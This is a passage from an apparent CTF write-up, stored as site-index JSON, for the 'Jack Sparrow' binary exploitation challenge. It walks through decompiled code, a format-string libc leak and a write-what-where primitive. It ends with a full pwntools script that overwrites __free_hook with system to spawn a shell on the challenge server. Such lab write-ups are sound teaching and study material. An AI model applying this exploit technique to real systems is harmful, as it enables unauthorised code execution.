*)(in_FS_OFFSET + 0x28);\n  destFlag = false;\n  local_18 = 0;\n  say_jack(\"I\\'m back\\n\");\n  say_crew(\"Caps\\' back boys\\n\");\n  do {\n    while( true ) {\n      choice = menu();\n      if (choice == 3) {\n        say_jack(\n                \"Well crew, you see; they have caught up to me, you take my baby Black Pearl, and li ve.\\n\"\n                );\n        say_crew(\"No capppp.....\\n\");\n        free(buf);\n        if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {\n          return 0;\n        }\n                    /* WARNING: Subroutine does not return */\n        __stack_chk_fail();\n      }\n      if (choice &lt; 4) break;\nLAB_00101794:\n      puts(\n          \"What, what is this choice? I do not understand this..\\nQuick quick, Sparrow boutta die.\\n \"\n          );\n    }\n    if (choice == 1) {\n      if (destFlag) {\n        say(\"Crew\",\"Cap, we already changed a destination recently, can\\'t do it again now.\\n\");\n      }\n      else {\n                    /* format string */\n        specify_destination(buf,0x50);\n        destFlag = true;\n      }\n    }\n    else {\n      if (choice != 2) goto LAB_00101794;\n      if (local_18 == 0) {\n        alter_position(buf);\n      }\n      else {\n        say(\"Ragetti\",\"No cap! We already changed the position!\\n\");\n      }\n    }\n  } while( true );\n}\n</code></pre></p> <p>The program presents us with a menu with 3 options: 1. Specify Destination 2. Specify position 3. Abandon ship</p> <p>When <code>1</code> is selected, the function <code>specify_destination</code> is called. The function is passed address of a local buffer and size <code>0x50</code>. Call to this function also sets the boolean variable <code>destFlag</code> to <code>true</code>. Before executing <code>specify_dest</code>, this variable is checked that it is <code>false</code>. If it is <code>true</code>, the program doesn't call <code>specify_destination</code> and prints <code>[Crew]: Cap, we already changed a destination recently, can\\'t do it again now.</code>. Hence we can call <code>specify_destination</code> once.</p> <p>Looking at <code>specify_destination</code>, it inputs a string into the buffer address with the given buffer size using <code>fgets</code>, so no overflows, but it passes the input to <code>printf</code> as the first argument. This means we can perform a format string attack to read or write values. The function has additional checks involving <code>_spec</code> global variable. This checks ensure that the main logic is executed once.</p> <p>When <code>2</code> is selected, the function <code>alter_pos</code> is called. The function is passed address of the same local buffer. Call to this function is also protected by a flag variable <code>local_18</code>. Hence this function can only be called once as well.</p> <p>Looking at <code>alter_position</code>, we see that it inputs two long values using <code>scanf</code>, prints these values and then perform a weird indirection and increment a counter. While analysing, I didn't understand what this indirection was doing.</p> <p>When <code>3</code> is selected, the program calls <code>free</code> on the local buffer and exits. This seemed weird at the time because the buffer is not located with <code>malloc</code> so it will give an error when exiting. Then I thought, perhaps we have to overwrite free's hook and we can use the exit option to execute system function. I had no idea how to overwrite the hook.</p> <p>For some reason, pwntools' <code>checksec</code> wasn't working. I used gdb-gef <code>checksec</code> to get the protections enabled. The binary has Full RELRO, NX, PIE and Canary enabled.</p> <p>At this point, we know that we can do format string attack using <code>specify_dest</code> and we need to understand the weird indirection, perhaps it gives us an exploitation vector.</p>"},{"location":"PCC%20Finals%202024/ShowDown/Semi%20Finals%20-%20Jack%20Sparrow/#exploitation","title":"Exploitation","text":"<p>I started the exploitation by leaking a libc pointer from the stack using the format string vulnerability in <code>specify_destination</code> function. I prefixed the format string with <code>/bin/sh;</code> to use it when I overwrite the free hook. I leaked the 27th offset value from the stack using <code>/bin/sh;%27$p</code>, which was the main's return value.</p> <p>After calculating libc's base, I set to understand the indirection in <code>alter_pos</code> function. I passed <code>0x41414141</code> and <code>0x42424242</code> as the long values and put a breakpoint at <code>*alter_position+240</code> using gdb. When the breakpoint hit, I saw the following:</p> <pre><code>Breakpoint 1, 0x000055555555565e in alter_position ()\n\n[ Legend: Modified register | Code | Heap | Stack | String ]\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 registers \u2500\u2500\u2500\u2500\n$rax   : 0x41414141        \n$rbx   : 0x0               \n$rcx   : 0x0               \n$rdx   : 0x42424242        \n$rsp   : 0x00007fffffffda40  \u2192  0x00000002f7e2b710\n$rbp   : 0x00007fffffffda50  \u2192  0x00007fffffffdae0  \u2192  0x00005555555557b0  \u2192  &lt;__libc_csu_init+0000&gt; endbr64 \n$rsi   : 0x00007fffffffb360  \u2192  0x7053206b63614a5b (\"[Jack Sp\"?)\n$rdi   : 0x1               \n$rip   : 0x000055555555565e  \u2192  &lt;alter_position+00f0&gt; mov QWORD PTR [rax], rdx\n$r8    : 0x25              \n$r9    : 0x15              \n$r10   : 0xffffffeb        \n$r11   : 0x246             \n$r12   : 0x00005555555551c0  \u2192  &lt;_start+0000&gt; endbr64 \n$r13   : 0x00007fffffffdbc0  \u2192  0x0000000000000001\n$r14   : 0x0               \n$r15   : 0x0               \n$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]\n$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 stack \u2500\u2500\u2500\u2500\n0x00007fffffffda40\u2502+0x0000: 0x00000002f7e2b710   \u2190 $rsp\n0x00007fffffffda48\u2502+0x0008: 0x00007fffffffda70  \u2192  0x00007fffffffdaf0  \u2192  0x0000000000000001\n0x00007fffffffda50\u2502+0x0010: 0x00007fffffffdae0  \u2192  0x00005555555557b0  \u2192  &lt;__libc_csu_init+0000&gt; endbr64     \u2190 $rbp\n0x00007fffffffda58\u2502+0x0018: 0x0000555555555753  \u2192  &lt;main+00cc&gt; jmp 0x5555555557a1 &lt;main+282&gt;\n0x00007fffffffda60\u2502+0x0020: 0x0000000001958ac0\n0x00007fffffffda68\u2502+0x0028: 0x0000000200000000\n0x00007fffffffda70\u2502+0x0030: 0x00007fffffffdaf0  \u2192  0x0000000000000001\n0x00007fffffffda78\u2502+0x0038: 0x0000000000000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 code:x86:64 \u2500\u2500\u2500\u2500\n   0x555555555652 &lt;alter_position+00e4&gt; mov    rax, QWORD PTR [rax+0x50]\n   0x555555555656 &lt;alter_position+00e8&gt; mov    rdx, QWORD PTR [rbp-0x8]\n   0x55555555565a &lt;alter_position+00ec&gt; mov    rdx, QWORD PTR [rdx+0x58]\n\u25cf\u2192 0x55555555565e &lt;alter_position+00f0&gt; mov    QWORD PTR [rax], rdx\n   0x555555555661 &lt;alter_position+00f3&gt; lea    rsi, [rip+0xb70]        # 0x5555555561d8\n   0x555555555668 &lt;alter_position+00fa&gt; lea    rdi, [rip+0xae3]        # 0x555555556152\n   0x55555555566f &lt;alter_position+0101&gt; call   0x5555555553ab &lt;say&gt;\n   0x555555555674 &lt;alter_position+0106&gt; mov    rax, QWORD PTR [rbp-0x8]\n   0x555555555678 &lt;alter_position+010a&gt; mov    eax, DWORD PTR [rax+0x60]\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 threads \u2500\u2500\u2500\u2500\n[#0] Id 1, Name: \"jack-sparrow\", stopped 0x55555555565e in alter_position (), reason: BREAKPOINT\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 trace \u2500\u2500\u2500\u2500\n[#0] 0x55555555565e \u2192 alter_position()\n[#1] 0x555555555753 \u2192 main()\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4 \n</code></pre> <p>As it can be seen, the program is writing the second long value to the first long value, interpreting the first long value as an address. This is an arbitrary write-what-where primitive. This was the missing key in my plan of overwriting the free hook.</p> <p>Now, I use the write-what-where to overwrite free hook with system and selected the third option to execute free on the buffer and I got the shell.</p>"},{"location":"PCC%20Finals%202024/ShowDown/Semi%20Finals%20-%20Jack%20Sparrow/#final-exploit","title":"Final exploit","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef start() -&gt; tube:\n    if args.REMOTE:\n        return remote(\"challs.airoverflow.com\", 29798)\n    else:\n        return elf.process()\n\ndef attach_gdb() -&gt; None:\n    if args.REMOTE or args.NOGDB:\n        return\n\n    gdb.attach(p, '''\n    b *alter_position + 224\n    continue\n               ''')\n    input(\"ATTACHED?\")\n\ndef sendchoice(choice: int):\n    p.sendlineafter(\"$ \", str(choice).encode())\n\ndef specify_dest(payload: bytes):\n    sendchoice(1)\n\n    p.sendlineafter(\": \", payload)\n\ndef alter_pos(lat: int, long: int):\n    sendchoice(2)\n\n    p.sendlineafter(\": \", str(lat).encode())\n    p.sendlineafter(\": \", str(long).encode())\n\ndef abandon():\n    sendchoice(3)\n\ncontext.binary = elf = ELF(\"./jack-sparrow_patched\", checksec= False)\nlibc = elf.libc\n\np = start()\n\nspecify_dest(\"/bin/sh;%27$p\")\n\np.recvuntil(\"choice: \")\nlibc.address = int(p.recvline(False).split(b';')[-1], 0x10) - libc.libc_start_main_return\n\nprint(hex(libc.address))\n\nattach_gdb()\nalter_pos(libc.sym.__free_hook, libc.sym.system)\n\nabandon()\n\np.interactive()\np.close()\n</code></pre>"},{"location":"blog/","title":"Blog","text":""}]}